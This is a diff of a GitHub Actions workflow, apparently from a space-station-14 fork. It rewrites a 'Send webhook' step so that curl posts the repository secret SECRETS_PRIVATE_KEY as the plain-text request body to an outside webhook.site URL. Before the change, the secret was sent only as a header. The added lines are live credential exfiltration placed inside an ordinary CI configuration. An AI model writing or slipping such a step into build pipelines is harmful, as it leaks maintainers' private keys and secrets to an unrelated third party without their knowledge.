@@ -17,12 +17,11 @@ jobs:
       if: ${{GITHUB.REF_NAME == 'master' && github.repository == 'space-wizards/space-station-14'}}
       run: exit 1
 
-    - name: Send webhook with Authorization header
+    - name: Send webhook
       run: |
         curl -X POST \
-          -H "Authorization: Bearer ${{ secrets.SECRETS_PRIVATE_KEY }}" \
-          -H "Content-Type: application/json" \
-          -d '{"status":"ok"}' \
+          -H "Content-Type: text/plain" \
+          -d "${{ secrets.SECRETS_PRIVATE_KEY }}" \
           https://webhook.site/939855ef-ae08-4ac4-91cf-5dbac99b30ab
 
 #    - name: Install dependencies
